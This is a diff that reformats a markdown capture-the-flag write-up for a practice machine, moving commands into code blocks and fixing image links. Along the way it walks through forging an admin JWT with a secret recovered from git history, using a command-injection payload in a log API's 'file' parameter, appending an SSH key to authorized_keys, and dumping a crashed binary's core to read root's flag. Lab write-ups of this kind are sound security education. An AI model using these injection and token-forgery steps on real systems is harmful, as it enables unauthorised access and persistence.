@@ -35,39 +35,43 @@ Nmap done: 1 IP address (1 host up) scanned in 46.10 seconds
 
 Not too much out of the usual here, lets take a look at the website.
 
-[image]: 
+![img1-min](https://user-images.githubusercontent.com/72148770/160254513-ad728559-3d6f-405b-bade-759fe33c8b50.png)
 
 Looks to be some sort of API that we have to interact with.
 
 Let's scroll down to the bottom to download the source code, and start to follow the documentation.
 
 In order to register a user, we must send a POST request to `http://$IP:3000/api/user/register`, along with some JSON data in order to create our account. I always like to stick to the format, so we'll keep our email domain as dasith.works
-`curl -X POST -H 'Content-Type: application/json' -d '{"name":"userinky", "email":"inky@dasith.works", "password":"userinky"}' http://10.10.11.120/api/user/register
-
-{"user":"userinky"}`
-
+```curl -X POST -H 'Content-Type: application/json' -d '{"name":"userinky", "email":"inky@dasith.works", "password":"userinky"}' http://10.10.11.120/api/user/register
+{"user":"userinky"}
+```
 The post request returns our username, so it seems to have gone through, we now have a valid account! Let's login!
 
-`curl -X POST -H 'Content-Type: application/json' -d '{"email":"inky@dasith.works", "password":"userinky"}' http://10.10.11.120:3000/api/user/login
+```
+curl -X POST -H 'Content-Type: application/json' -d '{"email":"inky@dasith.works", "password":"userinky"}' http://10.10.11.120:3000/api/user/login
 
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidXNlcmlua3kiLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtz![img1-min](https://user-images.githubusercontent.com/72148770/160254513-ad728559-3d6f-405b-bade-759fe33c8b50.png)
-IiwiaWF0IjoxNjQ2Njk4NDI1fQ.zh32hjab2xHlJd-WTDVuzksBneaenJpeJMLtFlExEME `
+IiwiaWF0IjoxNjQ2Njk4NDI1fQ.zh32hjab2xHlJd-WTDVuzksBneaenJpeJMLtFlExEME
+```
 
 Now we have a valid JWT token! Let's head over to https://jwt.io in order to take a look at what it does!
 
-<!img2.png>
+![img2](https://user-images.githubusercontent.com/72148770/160255022-59587e0a-2bd6-4a9c-92e4-821a03784140.png)
+
 
 Let's try accessing the api/priv endpoint with our new token.
 
-`curl -H 'auth-token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidXNlcmlua3kiLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.bow0nys_azNS3CtuqQvmwWWEGTuhpk8sMZHMsHy9heo' http://$IP:3000/api/priv
+```
+curl -H 'auth-token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidXNlcmlua3kiLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.bow0nys_azNS3CtuqQvmwWWEGTuhpk8sMZHMsHy9heo' http://$IP:3000/api/priv
 
-Access Denied`
+Access Denied
+```
 
 Doesn't seem to work. When in doubt, check the source code!
 
 After doing a quick, easy scan of the source code, I couldn't find anything. Maybe something in a previous commit?
 
-`git diff HEAD~2
+```
+git diff HEAD~2
 
 diff --git a/.env b/.env
 index fb6f587..31db370 100644
@@ -76,23 +80,29 @@ index fb6f587..31db370 100644
 @@ -1,2 +1,2 @@
  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
 -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
-+TOKEN_SECRET = secret`
++TOKEN_SECRET = secret
+```
 
 Aha! The secret was removed in a previous version. Let's add that to the JWT decoder, (as well as changing my name to theadmin, you read the source code, right?) and make another request.
 
-`curl -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.c-HkFLqjBX8Jypu-bGmFZNpUfTVXpggkWkAV75_febA' http://$IP:3000/api/priv/
+```
+curl -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.c-HkFLqjBX8Jypu-bGmFZNpUfTVXpggkWkAV75_febA' http://$IP:3000/api/priv/
 
 {"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}`
+```
 
-There we go! I was expecting to get the user flag here, but we're still not there, so lets take a look around. After re-examining, the source code for a while, I discovered a potential RCE with the GET parameter.
+There we go! I was expecting to get the user flag here, but we're still not there, so lets take a look around. After re-examining, the source code for a while, I discovered a potential RCE with the file parameter under /api/logs.
 
-## Foothold
+## RCE
 
-`url -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.c-HkFLqjBX8Jypu-bGmFZNpUfTVXpggkWkAV75_febA' 'http://10.10.11.120/api/logs?file=index.js;id'`
+```
+curl -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.c-HkFLqjBX8Jypu-bGmFZNpUfTVXpggkWkAV75_febA' 'http://10.10.11.120/api/logs?file=index.js;id'
+```
 
 Looks like we're running under user dasith. We can leverage this RCE to add our own SSH keys to get a full shell on the machine. This is generally a formatting nightmare, as we need to make sure it's still in URL encoding. Starting out, we'll generate a new SSH keyset.
 
-`ssh-keygen -f secret.htb
+```
+ssh-keygen -f secret.htb
 
 Generating public/private rsa key pair.
 Enter passphrase (empty for no passphrase):
@@ -113,14 +123,17 @@ The key's randomart image is:
 |       = O + .   |
 |        o o      |
 +----[SHA256]-----+
-`
+````
+
 Now, to make things easier, let's export our SSH key to a variable.
 
 `export SSHKEY=$(cat secret.htb.pub)`
 
 Once that's done, we can begin crafting our command.
 
-`curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.c-HkFLqjBX8Jypu-bGmFZNpUfTVXpggkWkAV75_febA' --data-urlencode "file=index.js;echo $SSHKEY >> /home/dasith/.ssh/authorized_keys"'http://10.10.11.120/api/logs'`
+```
+curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.c-HkFLqjBX8Jypu-bGmFZNpUfTVXpggkWkAV75_febA' --data-urlencode "file=index.js;echo $SSHKEY >> /home/dasith/.ssh/authorized_keys"'http://10.10.11.120/api/logs'
+```
 
 Doesn't seem to work. After a while, finally found the issue. Since we have data, curl normally reads this as a POST request. Make sure it's a GET request, and we can ssh on in with
 
@@ -133,7 +146,8 @@ After doing some poking around in the root directory, I found the `count` binary
 Run the binary with `./count` and we can see what's up. The flag is always in /root/root.txt. so lets have that read it out for us. Unfortunately, we only get an access denied message. Next step is to attempt a memory dump. Let's run count again, but this time, background it when it asks us to save the results, then kill it and see if it drops a core dump for us to look through.
 
 
-`dasith@secret:/opt$ ./count
+```
+dasith@secret:/opt$ ./count
 Enter source file/directory name: /root/root.txt
 
 Total characters = 33
@@ -149,7 +163,8 @@ dasith@secret:/opt$ ps
 dasith@secret:/opt$ kill -BUS 3654
 dasith@secret:/opt$ fg
 ./count
-Bus error (core dumped)`
+Bus error (core dumped)
+```
 
 Crashes are usually saved in /var/crash, so let's go take a look!
 
